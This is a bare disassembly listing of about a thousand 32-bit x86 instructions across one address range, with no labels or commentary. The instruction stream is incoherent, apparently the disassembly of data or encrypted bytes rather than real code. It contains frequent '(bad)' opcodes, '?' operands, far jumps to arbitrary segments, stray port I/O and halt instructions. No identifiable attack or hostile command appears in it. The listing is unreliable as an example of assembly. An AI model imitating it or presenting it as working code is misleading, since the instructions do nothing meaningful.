  41faf5:	mov    eax,ds:0xb7ec4384
  41fafa:	ficom  DWORD PTR [ebx-0x2e]
  41fafd:	in     al,0xb5
  41faff:	cdq    
  41fb00:	push   esp
  41fb01:	into   
  41fb02:	(bad)  
  41fb03:	clc    
  41fb04:	xor    BYTE PTR [esi+edi*2-0x7e1b4aea],0x3f
  41fb0c:	and    edx,DWORD PTR [ecx+0x2d18763c]
  41fb12:	or     DWORD PTR [edx],ebx
  41fb14:	ins    BYTE PTR es:[edi],dx
  41fb15:	pop    ds
  41fb16:	sub    DWORD PTR ds:0x57b0725b,esi
  41fb1c:	adc    al,BYTE PTR [eax-0x64e1ae2c]
  41fb22:	mov    bh,0x5e
  41fb24:	sub    eax,0x3cdecaa
  41fb29:	sar    ah,1
  41fb2b:	clc    
  41fb2c:	mov    al,dh
  41fb2e:	out    dx,eax
  41fb2f:	stos   BYTE PTR es:[edi],al
  41fb30:	adc    BYTE PTR [edi+0x29],dh
  41fb33:	fldl2t 
  41fb35:	data16 cmp BYTE PTR [edx],cl
  41fb38:	xor    eax,0xd14ab97a
  41fb3d:	enter  0x4775,0xd
  41fb41:	mov    dl,BYTE PTR [ebp+0x349ca441]
  41fb47:	jne    0x41fb6e
  41fb49:	cmp    esp,DWORD PTR [esi+ebx*8]
  41fb4c:	pop    ebx
  41fb4d:	inc    DWORD PTR [edi-0x38e0f81e]
  41fb53:	addr16 xor al,0x27
  41fb56:	jge    0x41fb76
  41fb58:	push   ds
  41fb59:	iret   
  41fb5a:	popfw  
  41fb5c:	and    al,BYTE PTR [edx-0x4c]
  41fb5f:	dec    eax
  41fb60:	ins    DWORD PTR es:[edi],dx
  41fb61:	jbe    0x41fb1d
  41fb63:	xchg   ecx,eax
  41fb64:	aaa    
  41fb65:	xor    DWORD PTR [ebp+0x10cc0742],ebp
  41fb6b:	ret    
  41fb6c:	cmp    ah,BYTE PTR [ebx]
  41fb6e:	les    esp,FWORD PTR [ecx]
  41fb70:	les    ecx,FWORD PTR [edx]
  41fb72:	dec    edi
  41fb73:	stos   DWORD PTR es:[edi],eax
  41fb74:	xor    DWORD PTR [ecx+ebp*1+0x642fd89e],0xffffffde
  41fb7c:	push   ds
  41fb7d:	or     eax,0xc53e75d3
  41fb82:	emms   
  41fb84:	dec    ebp
  41fb85:	cdq    
  41fb86:	outs   dx,BYTE PTR ds:[esi]
  41fb87:	xchg   ebp,eax
  41fb88:	call   0x4d4e:0xcd208ce2
  41fb8f:	(bad)
  41fb93:	mov    ecx,0xe52d11ff
  41fb98:	mov    dh,0x44
  41fb9a:	cmp    ecx,DWORD PTR [eax]
  41fb9c:	pop    esp
  41fb9d:	mov    edx,0xfa524732
  41fba2:	push   0x40
  41fba4:	lods   al,BYTE PTR ds:[esi]
  41fba5:	retf   
  41fba6:	mov    cl,0x77
  41fba8:	pop    esp
  41fba9:	xchg   edi,eax
  41fbaa:	sar    edx,1
  41fbac:	jb     0x41fb97
  41fbae:	icebp  
  41fbaf:	sbb    eax,0xcc7874cc
  41fbb4:	pop    es
  41fbb5:	lods   eax,DWORD PTR ds:[esi]
  41fbb6:	push   0xa7e971f1
  41fbbb:	inc    eax
  41fbbc:	mov    cl,0xd
  41fbbe:	stos   DWORD PTR es:[edi],eax
  41fbbf:	scas   eax,DWORD PTR es:[edi]
  41fbc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbc1:	or     ecx,DWORD PTR [ebx+0x2b]
  41fbc4:	sbb    dh,BYTE PTR [ebx]
  41fbc6:	cmp    BYTE PTR [ecx-0x61],0x6f
  41fbca:	es jb  0x41fb5b
  41fbcd:	fwait
  41fbce:	stc    
  41fbcf:	and    al,0xb9
  41fbd1:	jmp    0xd61c:0x8428656f
  41fbd8:	mov    WORD PTR [ecx-0x34004f61],fs
  41fbde:	popa   
  41fbdf:	dec    edi
  41fbe0:	sub    BYTE PTR [edx],0x23
  41fbe3:	adc    DWORD PTR [edx+ebp*1],0x9c7f433f
  41fbea:	pop    edi
  41fbeb:	inc    ebp
  41fbec:	xor    DWORD PTR [eax-0x6c],esi
  41fbef:	jae    0x41fc6d
  41fbf1:	jge    0x41fb8e
  41fbf3:	call   0xa209338f
  41fbf8:	xor    ecx,esi
  41fbfa:	add    al,BYTE PTR [ebx*2+0x7e25e2ba]
  41fc01:	adc    bl,ah
  41fc03:	xchg   esp,eax
  41fc04:	pop    edx
  41fc05:	jno    0x41fbd5
  41fc07:	jecxz  0x41fbbc
  41fc09:	mov    ss,WORD PTR [esi-0x2e39a1ae]
  41fc0f:	add    BYTE PTR [ebx-0x73b9d17e],al
  41fc15:	out    dx,al
  41fc16:	jnp    0x41fc12
  41fc18:	mov    esp,ecx
  41fc1a:	std    
  41fc1b:	in     eax,dx
  41fc1c:	inc    ecx
  41fc1d:	daa    
  41fc1e:	scas   eax,DWORD PTR es:[edi]
  41fc1f:	pop    ds
  41fc20:	div    esi
  41fc22:	or     esi,ebx
  41fc24:	aaa    
  41fc25:	mov    dh,BYTE PTR [eax+0x5f58fbdb]
  41fc2b:	je     0x41fc52
  41fc2d:	je     0x41fc6f
  41fc2f:	test   al,0xfc
  41fc31:	mov    ch,0xc1
  41fc33:	xchg   ebp,eax
  41fc34:	push   ss
  41fc35:	adc    dl,BYTE PTR [edi]
  41fc37:	mov    ah,BYTE PTR [edi+0x14]
  41fc3a:	pop    ss
  41fc3b:	retf   0xbb78
  41fc3e:	int    0xe7
  41fc40:	xchg   edi,eax
  41fc41:	adc    eax,0xe00c084c
  41fc46:	xchg   ecx,eax
  41fc47:	and    BYTE PTR [ecx-0x149cf201],dl
  41fc4d:	mov    esi,0xccc49138
  41fc52:	jl     0x41fc99
  41fc54:	in     al,dx
  41fc55:	arpl   WORD PTR [ebp+0xc],sp
  41fc58:	in     eax,dx
  41fc59:	pusha  
  41fc5a:	ret    0x9ae2
  41fc5d:	jl     0x41fc4e
  41fc5f:	cdq    
  41fc60:	out    dx,eax
  41fc61:	test   BYTE PTR [edx+0x75],0xf7
  41fc65:	jecxz  0x41fc87
  41fc67:	cld    
  41fc68:	xchg   DWORD PTR [edi-0x36ab81db],esp
  41fc6e:	mov    BYTE PTR [edx],bh
  41fc70:	mov    ds:0x6b5451fd,eax
  41fc75:	mov    dh,0x9b
  41fc77:	mul    DWORD PTR [edx]
  41fc79:	jecxz  0x41fcef
  41fc7b:	call   0xc498:0x514a715e
  41fc82:	lock xor esi,0xfffffff8
  41fc86:	sub    edi,DWORD PTR fs:[ebp-0x1]
  41fc8a:	xchg   edi,eax
  41fc8b:	int3   
  41fc8c:	sub    eax,0x6d7eee80
  41fc91:	sub    cl,BYTE PTR ds:0x2493b2b2
  41fc97:	adc    DWORD PTR gs:[eax],edx
  41fc9a:	stc    
  41fc9b:	(bad)  
  41fc9c:	jmp    0x41fd13
  41fc9e:	loope  0x41fc75
  41fca0:	retf   0x3ddd
  41fca3:	je     0x41fc5d
  41fca5:	and    al,0x13
  41fca7:	cmp    esp,DWORD PTR [ebp+0xc]
  41fcaa:	into   
  41fcab:	enter  0x2dfb,0x6f
  41fcaf:	(bad)  
  41fcb0:	sar    bl,1
  41fcb2:	ret    
  41fcb3:	mov    ds:0xdf33b96a,al
  41fcb8:	jnp    0x41fc9a
  41fcba:	push   ecx
  41fcbb:	sub    al,0x54
  41fcbd:	popa   
  41fcbe:	pop    ecx
  41fcbf:	pushf  
  41fcc0:	sub    DWORD PTR [bp-0x42],esp
  41fcc4:	sbb    dl,BYTE PTR [edx-0x49]
  41fcc7:	mov    ds:0x84d6492a,al
  41fccc:	mov    al,ds:0xd484b46c
  41fcd1:	shl    ch,0xde
  41fcd4:	or     BYTE PTR [esi-0x1f7747f1],ah
  41fcda:	adc    bl,BYTE PTR [ebx+edx*2]
  41fcdd:	push   esp
  41fcde:	inc    edi
  41fcdf:	or     cl,0x6e
  41fce2:	and    eax,0x71403de9
  41fce7:	lds    edx,FWORD PTR [edx+0x20c103fc]
  41fced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcee:	mov    ecx,0x46afd11e
  41fcf3:	test   eax,0xa268bc1f
  41fcf8:	idiv   BYTE PTR [esi-0xa6cbb90]
  41fcfe:	xchg   al,bl
  41fd00:	jl     0x41fcc0
  41fd02:	lods   eax,DWORD PTR ds:[esi]
  41fd03:	scas   eax,DWORD PTR es:[edi]
  41fd04:	add    bh,bh
  41fd06:	ja     0x41fcdc
  41fd08:	xchg   ecx,eax
  41fd09:	fadd   QWORD PTR [ecx+0x70]
  41fd0c:	test   BYTE PTR [eax+0x735164e2],al
  41fd12:	push   0xffffffb1
  41fd14:	mov    esp,0x4c27f293
  41fd19:	(bad)  
  41fd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd1b:	jne    0x41fd15
  41fd1d:	outs   dx,DWORD PTR ds:[esi]
  41fd1e:	les    ebp,FWORD PTR [esi-0x1b]
  41fd21:	(bad)  
  41fd22:	(bad)  
  41fd23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd24:	cmp    DWORD PTR [edx+ebx*1-0x34],esi
  41fd28:	je     0x41fcd9
  41fd2a:	jno    0x41fcd2
  41fd2c:	sub    eax,0x90e5c58b
  41fd31:	sbb    DWORD PTR cs:[eax-0x4a],ebp
  41fd35:	xor    eax,0x2a3670a4
  41fd3a:	int    0xab
  41fd3c:	aas    
  41fd3d:	outs   dx,BYTE PTR ds:[esi]
  41fd3e:	and    cl,0x93
  41fd41:	shr    DWORD PTR [esi+0x7e740bbf],0xd7
  41fd48:	aaa    
  41fd49:	shr    DWORD PTR [ebx+edi*2],0x56
  41fd4d:	jmp    0x5ff9cf53
  41fd52:	into   
  41fd53:	pop    ecx
  41fd54:	and    bh,BYTE PTR [ecx+0xcade825]
  41fd5a:	xchg   DWORD PTR [eax-0x73afd6b2],edx
  41fd60:	add    eax,0x67fe4484
  41fd65:	ret    
  41fd66:	pop    eax
  41fd67:	(bad)  [ecx-0x6b]
  41fd6a:	ja     0x41fdbc
  41fd6c:	inc    edi
  41fd6d:	dec    eax
  41fd6e:	jns    0x41fda0
  41fd70:	test   BYTE PTR [edi],bl
  41fd72:	xor    edi,eax
  41fd74:	sbb    ch,BYTE PTR [eax]
  41fd76:	in     al,dx
  41fd77:	sti    
  41fd78:	inc    esi
  41fd79:	jns    0x41fdc0
  41fd7b:	xchg   esp,eax
  41fd7c:	ss hlt 
  41fd7e:	jmp    0x97e345ec
  41fd83:	jle    0x41fd82
  41fd85:	shl    bl,0x6f
  41fd88:	mov    ah,0x6
  41fd8a:	lahf   
  41fd8b:	adc    DWORD PTR [esi+0x1dac0bf3],eax
  41fd91:	mov    al,0xa6
  41fd93:	add    al,0xe4
  41fd95:	stos   BYTE PTR es:[edi],al
  41fd96:	fiadd  DWORD PTR [edx+edx*4+0x3f]
  41fd9a:	repnz xor al,0xb
  41fd9d:	pop    ecx
  41fd9e:	push   0x737d97bb
  41fda3:	mov    ds:0x56f28e8f,al
  41fda8:	pop    eax
  41fda9:	sar    BYTE PTR [esi+eiz*2],cl
  41fdac:	or     al,0x9c
  41fdae:	pop    DWORD PTR [esi-0x1e]
  41fdb1:	sahf   
  41fdb2:	mov    bl,BYTE PTR [ebx+0xf]
  41fdb5:	pop    eax
  41fdb6:	inc    ebx
  41fdb7:	and    al,cl
  41fdb9:	shl    BYTE PTR [edi],cl
  41fdbb:	cmp    ah,dh
  41fdbd:	nop
  41fdbe:	inc    ebx
  41fdbf:	push   eax
  41fdc0:	pop    esp
  41fdc1:	(bad)  
  41fdc2:	hlt    
  41fdc3:	fcmovnbe st,st(3)
  41fdc5:	loope  0x41fe15
  41fdc7:	scas   al,BYTE PTR es:[edi]
  41fdc8:	iret   
  41fdc9:	pop    esi
  41fdca:	push   eax
  41fdcb:	push   es
  41fdcc:	push   cs
  41fdcd:	cwde   
  41fdce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdcf:	inc    ebx
  41fdd0:	xor    bh,BYTE PTR ds:0xf9e97b1b
  41fdd6:	(bad)  
  41fdd7:	popf   
  41fdd8:	arpl   WORD PTR [ebx],si
  41fdda:	add    eax,0x6e7d7220
  41fddf:	cmp    BYTE PTR ss:0xcf3ab591,0x37
  41fde7:	mov    eax,0xf8679b7f
  41fdec:	push   eax
  41fded:	cmp    DWORD PTR [edx],ecx
  41fdef:	(bad)  
  41fdf0:	retf   0x26e9
  41fdf3:	mov    dh,0xb6
  41fdf5:	in     eax,0x85
  41fdf7:	bswap  ebx
  41fdf9:	xor    al,0x75
  41fdfb:	(bad)  
  41fdfc:	push   esi
  41fdfd:	dec    edx
  41fdfe:	xor    esp,ebp
  41fe00:	cmp    DWORD PTR [edx-0x54],edi
  41fe03:	xchg   ecx,eax
  41fe04:	les    edx,FWORD PTR [edx-0x2159dbf]
  41fe0a:	xor    BYTE PTR [eax-0x48102f81],ch
  41fe10:	popa   
  41fe11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe12:	pop    edi
  41fe13:	pop    edi
  41fe14:	jp     0x41fe3b
  41fe16:	repz cmc 
  41fe18:	out    0xec,eax
  41fe1a:	imul   BYTE PTR [ebx+ebp*2+0x3a]
  41fe1e:	xchg   esp,eax
  41fe1f:	aas    
  41fe20:	fucomi st,st(5)
  41fe22:	scas   eax,DWORD PTR es:[edi]
  41fe23:	loop   0x41fe92
  41fe25:	mov    ds:0x9d99b672,al
  41fe2a:	dec    ecx
  41fe2b:	xlat   BYTE PTR ds:[ebx]
  41fe2c:	pop    ebp
  41fe2d:	lahf   
  41fe2e:	cmp    ebx,DWORD PTR [eax+0x68]
  41fe31:	jle    0x41fdbf
  41fe33:	inc    edi
  41fe34:	cvttps2pi mm7,QWORD PTR [ecx-0x47a85b9a]
  41fe3b:	pop    ebp
  41fe3c:	jecxz  0x41fea1
  41fe3e:	jae    0x41fe63
  41fe40:	mov    eax,0xbd71c2aa
  41fe45:	jl     0x41fe57
  41fe47:	jp     0x41fde7
  41fe49:	mov    ch,0xa1
  41fe4b:	imul   ebx,DWORD PTR [edi+0x350b9c66],0x31
  41fe52:	add    eax,0x7724fd7
  41fe57:	adc    al,0x1e
  41fe59:	test   DWORD PTR [esp+esi*2-0x5b],eax
  41fe5d:	(bad)  
  41fe5e:	xchg   edx,eax
  41fe5f:	les    esi,FWORD PTR [edx-0x3430e0d8]
  41fe65:	mov    ch,0x5
  41fe67:	pop    ebp
  41fe68:	or     BYTE PTR [ebp-0x6d2028c8],bh
  41fe6e:	add    esi,ecx
  41fe70:	xchg   BYTE PTR [ebp+0x754982b5],al
  41fe76:	scas   eax,DWORD PTR es:[edi]
  41fe77:	retf   
  41fe78:	mov    esp,0x2bb6c38c
  41fe7d:	cld    
  41fe7e:	push   edx
  41fe7f:	xchg   edi,eax
  41fe80:	test   esp,eax
  41fe82:	ss addr16 ret 
  41fe85:	sbb    BYTE PTR [edx],cl
  41fe87:	sbb    DWORD PTR [ecx+0x2b],edx
  41fe8a:	pop    es
  41fe8b:	mov    ds:0x4efd9f69,al
  41fe90:	xchg   DWORD PTR [esp+eax*4-0x11],edx
  41fe94:	(bad)  
  41fe95:	stc    
  41fe96:	lods   al,BYTE PTR ds:[esi]
  41fe97:	in     eax,dx
  41fe98:	outs   dx,DWORD PTR ds:[esi]
  41fe99:	stc    
  41fe9a:	jmp    0x35ac1d38
  41fe9f:	jbe    0x41feec
  41fea1:	mul    bl
  41fea3:	enter  0xcbd9,0xb7
  41fea7:	adc    al,0x98
  41fea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feaa:	inc    esi
  41feab:	inc    ecx
  41feac:	mov    ebp,0x9321058f
  41feb1:	dec    esi
  41feb2:	outs   dx,BYTE PTR ds:[esi]
  41feb3:	int    0xe7
  41feb5:	push   cs
  41feb6:	mov    WORD PTR [ebx+0x21],ds
  41feb9:	and    bl,BYTE PTR [ebp-0x21]
  41febc:	call   0xd818:0xce0f9c25
  41fec3:	repnz bswap ebp
  41fec6:	mov    edx,0xc69f0b7e
  41fecb:	aam    0xa8
  41fecd:	dec    ecx
  41fece:	hlt    
  41fecf:	jge    0x41ff39
  41fed1:	and    cl,BYTE PTR [ebx-0x5a200b1c]
  41fed7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fed8:	fstp   DWORD PTR [esi-0x62d9ec4f]
  41fede:	fcom   QWORD PTR ds:0xf2474112
  41fee4:	add    BYTE PTR [eax-0xaecc443],dh
  41feea:	repnz out dx,al
  41feec:	adc    ah,bh
  41feee:	mov    esp,0xf482fcc5
  41fef3:	outs   dx,BYTE PTR ds:[esi]
  41fef4:	add    bl,ch
  41fef6:	mov    ds:0x91b14b55,al
  41fefb:	adc    DWORD PTR [esi-0x1fc5add7],ebp
  41ff01:	pop    ecx
  41ff02:	pop    eax
  41ff03:	pop    ebp
  41ff04:	in     eax,dx
  41ff05:	add    al,0xde
  41ff07:	repnz dec ecx
  41ff09:	loope  0x41ff45
  41ff0b:	out    0xa9,eax
  41ff0d:	mov    WORD PTR [esi+0x2f],ds
  41ff10:	xor    eax,0xbbec0a11
  41ff15:	mov    ds:0x7eb48969,eax
  41ff1a:	mov    edi,0x8ef96951
  41ff1f:	add    ebx,esp
  41ff21:	cmc    
  41ff22:	cmc    
  41ff23:	adc    al,0x5e
  41ff25:	mov    ?,ebx
  41ff27:	sbb    DWORD PTR [edi-0x2a],edx
  41ff2a:	ds test eax,0x7a397c09
  41ff30:	in     al,dx
  41ff31:	xchg   edx,eax
  41ff32:	mov    BYTE PTR [edi+0x347e6f6c],al
  41ff38:	repz (bad) 
  41ff3a:	jmp    0xdf7aed7d
  41ff3f:	aas    
  41ff40:	mov    ebx,DWORD PTR [edx-0x5f]
  41ff43:	out    0x44,eax
  41ff45:	je     0x41ff68
  41ff47:	loopne 0x41ff0c
  41ff49:	inc    ecx
  41ff4a:	and    ecx,0xf67d1487
  41ff50:	imul   ecx,DWORD PTR [ebp+0x2e2084d2],0x578c3119
  41ff5a:	add    al,BYTE PTR [edi+0x72cccfea]
  41ff60:	dec    eax
  41ff61:	mov    BYTE PTR [edi-0x3e5e3400],dl
  41ff67:	and    edi,DWORD PTR [edi-0x36]
  41ff6a:	sbb    ch,ch
  41ff6c:	or     eax,DWORD PTR [esi-0x52a55cde]
  41ff72:	cmp    ebx,DWORD PTR [ebx]
  41ff74:	xor    dl,al
  41ff76:	jge    0x41ffcd
  41ff78:	test   eax,0xc231f179
  41ff7d:	icebp  
  41ff7e:	pusha  
  41ff7f:	mov    ch,0x9c
  41ff81:	jne    0x41ffeb
  41ff83:	jmp    0x5050:0xcfbeb360
  41ff8a:	(bad)  
  41ff8b:	jns    0x41ff22
  41ff8d:	hlt    
  41ff8e:	data16 cld 
  41ff90:	cmc    
  41ff91:	mov    cl,BYTE PTR [ebx]
  41ff93:	aad    0xc7
  41ff95:	push   cs
  41ff96:	jecxz  0x41ffa5
  41ff98:	popf   
  41ff99:	shl    BYTE PTR [edi-0x4ba94362],cl
  41ff9f:	leave  
  41ffa0:	mov    bl,bl
  41ffa2:	sbb    eax,0xfa587a08
  41ffa7:	ds pop edi
  41ffa9:	ror    al,cl
  41ffab:	push   ecx
  41ffac:	dec    DWORD PTR [bp-0x75db]
  41ffb1:	adc    cl,al
  41ffb3:	pop    ss
  41ffb4:	(bad)  
  41ffb5:	in     ax,dx
  41ffb7:	sahf   
  41ffb8:	push   ss
  41ffb9:	sbb    al,0x39
  41ffbb:	adc    edx,edx
  41ffbd:	push   ecx
  41ffbe:	xchg   esi,eax
  41ffbf:	push   ds
  41ffc0:	cmp    dl,bl
  41ffc2:	out    0x5b,al
  41ffc4:	mov    edx,?
  41ffc6:	cs sbb al,0x13
  41ffc9:	lock sbb bl,BYTE PTR [eax+esi*2]
  41ffcd:	xor    eax,0xd6aeaddf
  41ffd2:	xchg   ebp,eax
  41ffd3:	ror    BYTE PTR ss:[eax+0x3f732f80],1
  41ffda:	ja     0x41ffd2
  41ffdc:	repnz ror BYTE PTR ss:[edi+0x2fc9484e],0x92
  41ffe5:	push   esp
  41ffe6:	pop    esp
  41ffe7:	adc    al,0xf2
  41ffe9:	cmp    BYTE PTR [edx+0x49],dl
  41ffec:	scas   eax,DWORD PTR es:[edi]
  41ffed:	sahf   
  41ffee:	lods   al,BYTE PTR ds:[esi]
  41ffef:	fdiv   QWORD PTR [edx-0x9d378b4]
  41fff5:	iret   
  41fff6:	lods   eax,DWORD PTR ds:[esi]
  41fff7:	and    eax,0x369126e8
  41fffc:	sbb    BYTE PTR [esi],al
  41fffe:	push   ebp
  41ffff:	ss scas al,BYTE PTR es:[edi]
  420001:	dec    ecx
  420002:	ja     0x41ffcc
  420004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420005:	ror    BYTE PTR [eax+0x7f],1
  420008:	sbb    DWORD PTR [ebx+0xd044372],0x6ec2a587
  420012:	into   
  420013:	(bad)  
  420014:	lahf   
  420015:	mov    ebp,0x68290de
  42001a:	jmp    0x420028
  42001c:	mov    dh,0x74
  42001e:	and    eax,0xf20edf16
  420023:	or     al,0xb4
  420025:	xlat   BYTE PTR ds:[ebx]
  420026:	add    WORD PTR [esi-0xd],si
  42002a:	ja     0x4200a8
  42002c:	es jne 0x42009b
  42002f:	jmp    0x35b2bd7e
  420034:	or     eax,0x3f140923
  420039:	pop    eax
  42003a:	mov    al,bh
  42003c:	ins    DWORD PTR es:[edi],dx
  42003d:	mov    bh,0x57
  42003f:	add    al,0xb0
  420041:	mov    edx,0xc2de139b
  420046:	cmp    dh,BYTE PTR [edx-0x6cc0acb1]
  42004c:	ja     0x420099
  42004e:	out    0x98,eax
  420050:	scas   al,BYTE PTR es:[edi]
  420051:	ss or  esp,0x37
  420055:	fwait
  420056:	pop    esi
  420057:	cli    
  420058:	jmp    0x42009d
  42005a:	out    dx,al
  42005b:	enter  0xa627,0xb1
  42005f:	and    eax,0xda529867
  420064:	xchg   ebx,eax
  420065:	scas   al,BYTE PTR es:[edi]
  420066:	fwait
  420067:	imul   BYTE PTR [ebp+0xb]
  42006a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42006b:	adc    ah,BYTE PTR [eax]
  42006d:	xchg   edx,eax
  42006e:	mov    ebx,0x7c8c2949
  420073:	mov    dh,0x96
  420075:	int3   
  420076:	popf   
  420077:	dec    eax
  420078:	aam    0x4c
  42007a:	mov    ebx,0x75c14888
  42007f:	pusha  
  420080:	push   ss
  420081:	add    eax,0x564c118d
  420086:	rcl    esi,cl
  420088:	inc    esp
  420089:	xchg   ecx,eax
  42008a:	ss fwait
  42008c:	push   eax
  42008d:	adc    dl,BYTE PTR [eax-0x1f]
  420090:	(bad)  
  420091:	sub    al,0x6a
  420093:	sbb    BYTE PTR [ebx+0x715e4376],ah
  420099:	(bad)  
  42009a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42009b:	pop    ss
  42009c:	imul   BYTE PTR [ebp+0x71]
  42009f:	pop    edi
  4200a0:	adc    bl,BYTE PTR [ebp+0x58311dd2]
  4200a6:	push   cs
  4200a7:	in     al,dx
  4200a8:	mov    ecx,0xd93c1b51
  4200ad:	shr    bh,cl
  4200af:	xchg   edx,eax
  4200b0:	push   0x5e57875b
  4200b5:	adc    DWORD PTR [ecx+ebp*2-0x69],0xfffffff9
  4200ba:	lahf   
  4200bb:	shl    BYTE PTR [esi+ecx*1+0x5e],1
  4200bf:	add    dh,al
  4200c1:	cdq    
  4200c2:	pop    ecx
  4200c3:	mov    dh,0xa8
  4200c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200c6:	lahf   
  4200c7:	pop    ss
  4200c8:	sahf   
  4200c9:	int3   
  4200ca:	push   esi
  4200cb:	dec    esi
  4200cc:	sub    al,0x2d
  4200ce:	mov    ch,0x49
  4200d0:	in     al,0xa8
  4200d2:	repnz push edx
  4200d4:	inc    ebp
  4200d5:	inc    ecx
  4200d6:	into   
  4200d7:	push   esp
  4200d8:	int    0xd4
  4200da:	cmp    esi,DWORD PTR [ebx+ecx*1+0x1d]
  4200de:	fbstp  TBYTE PTR [edi+edi*1-0x1d]
  4200e2:	cs daa 
  4200e4:	or     ebp,DWORD PTR [ecx-0x49e2e531]
  4200ea:	ins    BYTE PTR es:[edi],dx
  4200eb:	mov    BYTE PTR [ecx],bh
  4200ed:	test   al,0xff
  4200ef:	xchg   edi,eax
  4200f0:	or     ebp,DWORD PTR [ebp+0x4c50b0a0]
  4200f6:	jmp    0x732136a5
  4200fb:	int3   
  4200fc:	xor    BYTE PTR [eax-0xdc9700a],0x4b
  420103:	aam    0xa7
  420105:	add    DWORD PTR [edi-0x67],ebx
  420108:	lea    edx,[edi]
  42010a:	mov    ch,0x4e
  42010c:	xchg   edi,eax
  42010d:	xchg   edi,eax
  42010e:	xchg   edi,eax
  42010f:	or     al,0x96
  420111:	std    
  420112:	cwde   
  420113:	mov    ds:0x51e432ff,eax
  420118:	add    BYTE PTR [esi+0x11],cl
  42011b:	sub    eax,0x617be52f
  420120:	popa   
  420121:	inc    esp
  420122:	lahf   
  420123:	mov    eax,0x17baf173
  420128:	jnp    0x4200fc
  42012a:	jp     0x420153
  42012c:	(bad)  
  42012d:	shr    DWORD PTR [ebp-0x5272d87a],1
  420133:	aam    0x92
  420135:	rcr    bh,0xd
  420138:	sar    BYTE PTR [ebp+0x3bf21b87],0xca
  42013f:	sbb    ah,BYTE PTR [esi+edx*4]
  420142:	inc    ecx
  420143:	aas    
  420144:	jecxz  0x4200ff
  420146:	in     al,0xfc
  420148:	ret    0x9ea4
  42014b:	xchg   edi,eax
  42014c:	or     edi,eax
  42014e:	sti    
  42014f:	mov    bh,0x6d
  420151:	(bad)  
  420152:	clc    
  420153:	retf   0x5e29
  420156:	es jp  0x420175
  420159:	in     al,0x70
  42015b:	lahf   
  42015c:	xchg   ebx,eax
  42015d:	and    al,0xe5
  42015f:	out    dx,eax
  420160:	mov    ds:0xea32eab7,eax
  420165:	pop    esp
  420166:	pop    esp
  420167:	cdq    
  420168:	arpl   WORD PTR [eax+0x34],cx
  42016b:	sbb    al,0xe
  42016d:	inc    eax
  42016e:	nop
  42016f:	ficomp WORD PTR [eax+0x31]
  420172:	push   ds
  420173:	in     eax,0x34
  420175:	ja     0x4201d7
  420177:	jge    0x42013c
  420179:	jae    0x4201c9
  42017b:	pop    ds
  42017c:	(bad)  
  42017e:	test   BYTE PTR [edx],ah
  420180:	adc    al,BYTE PTR [eax+0x54da4848]
  420186:	stos   DWORD PTR es:[edi],eax
  420187:	fldcw  WORD PTR [edx+0x7a]
  42018a:	(bad)  
  42018b:	enter  0xbe4d,0x1e
  42018f:	mov    edx,0xf9a157dd
  420194:	pop    edi
  420195:	scas   eax,DWORD PTR es:[edi]
  420196:	mov    edx,0x2052ea9a
  42019b:	xchg   esp,eax
  42019c:	mov    dl,0x6b
  42019e:	add    ch,BYTE PTR ds:0xa035fe91
  4201a4:	pop    ebp
  4201a5:	hlt    
  4201a6:	repnz add bh,BYTE PTR [ebp-0x73]
  4201aa:	test   ch,ah
  4201ac:	push   0xffffff8e
  4201ae:	aad    0x7b
  4201b0:	aam    0xbd
  4201b2:	cmp    ecx,DWORD PTR [ebx+ebp*1-0x3f]
  4201b6:	out    dx,al
  4201b7:	sbb    DWORD PTR fs:[ebp+0x7fbe70ef],0x70
  4201bf:	cmp    al,0x17
  4201c1:	hlt    
  4201c2:	(bad)  
  4201c3:	fimul  DWORD PTR [eax+0x76]
  4201c6:	jl     0x420150
  4201c8:	sti    
  4201c9:	aas    
  4201ca:	xchg   ebp,eax
  4201cb:	iret   
  4201cc:	push   ecx
  4201cd:	mov    esi,0xdbd62a00
  4201d2:	imul   DWORD PTR [ebp-0x59e06f81]
  4201d8:	into   
  4201d9:	inc    esi
  4201da:	adc    ebp,DWORD PTR [eax-0x2f]
  4201dd:	add    dl,0x3c
  4201e0:	mov    ebp,0x9fdbc33e
  4201e5:	sbb    eax,0x406aadbb
  4201ea:	and    DWORD PTR [ecx+0x32bfc626],0x53
  4201f1:	and    al,0x1c
  4201f3:	and    BYTE PTR [edx-0x12],bh
  4201f6:	pop    edx
  4201f7:	lods   al,BYTE PTR ds:[esi]
  4201f8:	push   cs
  4201f9:	jnp    0x4201b6
  4201fb:	mov    gs,WORD PTR ds:0xeec4ae4f
  420201:	test   DWORD PTR [edi-0x78],0x358051d2
  420208:	adc    al,0xef
  42020a:	jne    0x420228
  42020c:	add    al,0x8e
  42020e:	sub    DWORD PTR ds:0x65788c1a,eax
  420214:	cmp    ecx,esi
  420216:	popa   
  420217:	or     eax,0xb155e385
  42021c:	xor    cl,0xdd
  42021f:	pop    ss
  420220:	mov    ch,0x4d
  420222:	adc    al,0xe2
  420224:	xchg   edi,eax
  420225:	(bad)  
  420226:	cwde   
  420227:	push   cs
  420228:	dec    edi
  420229:	jecxz  0x42024f
  42022b:	cs sbb eax,0xb842056c
  420231:	xchg   DWORD PTR [esi-0x6b2b0c8b],ebp
  420237:	jmp    0x8cefde9d
  42023c:	dec    BYTE PTR [esi-0x19a260c8]
  420242:	out    0x30,al
  420244:	enter  0xf94a,0x1
  420248:	(bad)  
  420249:	cmp    eax,0x85b90a1c
  42024e:	dec    edi
  42024f:	test   BYTE PTR [edi+0x1b216612],bh
  420255:	(bad)  
  420256:	or     ecx,DWORD PTR [ecx-0x62]
  420259:	imul   ebp,DWORD PTR [ebx+edi*2+0x58],0x8b8ef146
  420261:	mov    es,edi
  420263:	and    ah,0x73
  420266:	push   0x7b
  420268:	pop    ds
  420269:	mov    BYTE PTR [edx],0x6b
  42026c:	add    al,0x14
  42026e:	jg     0x420244
  420270:	pop    eax
